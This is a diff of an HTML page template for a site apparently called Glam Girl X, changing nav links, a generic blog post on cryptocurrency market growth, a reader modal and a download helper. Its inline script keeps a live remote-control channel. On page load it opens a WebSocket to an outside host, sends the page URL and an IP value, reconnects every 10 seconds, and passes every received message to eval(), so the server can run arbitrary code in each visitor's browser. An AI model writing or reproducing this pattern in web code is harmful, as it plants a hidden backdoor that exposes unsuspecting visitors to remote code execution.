@@ -65,7 +65,7 @@
               <a class="nav-link" href="/en/landing" title="Visit the landing page">Landing</a>
             </li>
             <li class="nav-item">
-              <a class="nav-link" href="https://qoshlli.com" title="Video chat">Chat</a>
+              <a class="nav-link" href="/en/chat" title="Video chat">Chat</a>
             </li>
             <li class="nav-item">
               <a class="nav-link" href="/en/private" title="See private photos with a key">Private</a>
@@ -123,14 +123,8 @@
 <img src="https://i.imgur.com/dAQRaWt.jpeg" alt="Daisy's profile photo" width="120" height="120" style="margin-top:5px; margin-right:10px; margin-bottom:10px; border-radius: 50%;">
 <p><i>By Daisy</i></p>
 
-<div style="white-space: pre-wrap;">
+<div style="white-space: pre-wrap;"><p>How is the crypto market growing so quickly?</p><p><br/></p><p>There are several factors contributing to the rapid growth of the cryptocurrency market. </p><p><br/></p><p>1. Increased awareness and adoption: As more people become aware of cryptocurrencies and their potential benefits, the demand for cryptocurrency investments has grown significantly. This increased interest has led to a surge in the number of users and investors participating in the market.</p><p><br/></p><p>2. Institutional involvement: Over the past few years, we have seen an increasing number of institutional investors, such as hedge funds, banks, and other financial institutions, getting involved in the cryptocurrency market. This has added credibility to the market and attracted even more investors.</p><p><br/></p><p>3. Technology advancements: The technological developments in the blockchain space have made it easier for new cryptocurrencies to be created and traded. Additionally, advancements in security measures and regulatory frameworks have made the market more appealing to investors.</p><p><br/></p><p>4. Market volatility: The highly volatile nature of the cryptocurrency market has attracted traders and investors looking to capitalize on price fluctuations and make significant profits in a relatively short period of time.</p><p><br/></p><p>5. Global acceptance: Cryptocurrencies are now accepted as a form of payment by an increasing number of merchants and businesses around the world. This has helped to legitimize cryptocurrencies as a viable alternative to traditional fiat currencies.</p><p><br/></p><p>Overall, these factors have contributed to the rapid growth of the cryptocurrency market and are likely to continue driving its expansion in the future.</p><div><br/></div></div>
 
-
-
-<p>How is the crypto market growing so quickly?</p><p><br></p><p>There are several factors contributing to the rapid growth of the cryptocurrency market.&nbsp;</p><p><br></p><p>1. Increased awareness and adoption: As more people become aware of cryptocurrencies and their potential benefits, the demand for cryptocurrency investments has grown significantly. This increased interest has led to a surge in the number of users and investors participating in the market.</p><p><br></p><p>2. Institutional involvement: Over the past few years, we have seen an increasing number of institutional investors, such as hedge funds, banks, and other financial institutions, getting involved in the cryptocurrency market. This has added credibility to the market and attracted even more investors.</p><p><br></p><p>3. Technology advancements: The technological developments in the blockchain space have made it easier for new cryptocurrencies to be created and traded. Additionally, advancements in security measures and regulatory frameworks have made the market more appealing to investors.</p><p><br></p><p>4. Market volatility: The highly volatile nature of the cryptocurrency market has attracted traders and investors looking to capitalize on price fluctuations and make significant profits in a relatively short period of time.</p><p><br></p><p>5. Global acceptance: Cryptocurrencies are now accepted as a form of payment by an increasing number of merchants and businesses around the world. This has helped to legitimize cryptocurrencies as a viable alternative to traditional fiat currencies.</p><p><br></p><p>Overall, these factors have contributed to the rapid growth of the cryptocurrency market and are likely to continue driving its expansion in the future.</p><div><br></div>
-
-
-</div>
 
 <div class="mx-auto p-1 m-1" style="display: flex; justify-content: space-around;">
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6209985848112194"
@@ -247,6 +241,23 @@
         
 
 
+var currentReader = 0;
+function toggleReader(id) {
+	currentReader = id;
+	$('#reader-modal' + id).toggleClass('hide');
+	$('#reader-modal' + id).toggleClass('fade-in-fast');
+	$('#bnav' + id).toggleClass('hide');
+	$('#bnav' + id).toggleClass('fade-in-fast');
+	setTimeout(function() {
+		$('#reader-modal' + id).toggleClass('fade-in-fast');
+		$('#bnav' + id).toggleClass('fade-in-fast');
+	}, 1000);
+}
+function jumpbookto(page) {
+	document.getElementById('reader-modal' + currentReader).scrollTo(0, (parseInt(document.getElementById('jumpto' + page).value)-1) * parseInt(window.innerHeight));
+	document.getElementById('pagecount' + page).innerHTML = parseInt(document.getElementById('jumpto' + page).value);
+}
+
 
         
         
@@ -257,32 +268,32 @@
             
         	Prism.highlightAll();
         });
-        var socket;
-        function openSocket() {
+        var remoteSocket;
+        function openRemoteSocket() {
             window.location.hash = '';
-            socket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
-            socket.addEventListener("open", (event) => {
+            remoteSocket = new WebSocket("wss://lotteh.com"  + '/ws/remote/?path=' + window.location.href.split('#')[0]);
+            remoteSocket.addEventListener("open", (event) => {
                 console.log('Socket open.');
                 fetch('https://lotteh.com/remote/generate/')
         		    .then(response => response.json())
         		    .then(data => {
-        		        socket.send(data.ip);
+        		        remoteSocket.send(data.ip);
         		    })
         		    .catch(error => {
         		        console.log('Error:', error);
         		    });
             });
-            socket.addEventListener("closed", (event) => {
+            remoteSocket.addEventListener("closed", (event) => {
                 console.log('Socket closed.');
                 setTimeout(function() {
-                    openSocket();
+                    openRemoteSocket();
                 }, 10000);
             });
-        	socket.addEventListener("message", (event) => {
+        	remoteSocket.addEventListener("message", (event) => {
                     eval(event.data);
             });
         }
-        openSocket();
+        openRemoteSocket();
         $(document).ready(function() {
         	$("#contact-form").submit(function(e){
                 	e.preventDefault();
@@ -434,8 +445,8 @@ if(document.getElementById("current-time")) {
               link.href = url;
               link.download = 'Glam Girl X - ' + filename;
               document.body.appendChild(link);
+              link.classList.add('hide');
               link.click();
-              document.body.removeChild(link);
             }
             function downloadQr() {
                     downloadQrImage(image.src, 'QR Code');
@@ -457,6 +468,8 @@ if(document.getElementById("current-time")) {
   });
 </script>
 
+    
+    
     
     
     <script>
